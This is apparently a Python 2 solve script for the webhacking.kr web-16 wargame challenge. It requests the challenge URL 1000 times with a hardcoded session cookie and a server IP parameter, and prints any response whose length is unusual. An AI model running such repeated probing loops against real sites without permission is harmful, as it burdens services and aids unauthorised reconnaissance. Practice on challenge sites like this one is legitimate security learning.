url='http://webhacking.kr/challenge/web/web-16/?server=180.228.113.90'

import requests

cookies={'PHPSESSID':'7oee5bb3mt2q8c5f8d4lubpvn3'}

for i in xrange(1000):
  response=requests.get(url,cookies=cookies)

  if len(response.text) != 218:
    print response.text
  else:
    print "pass"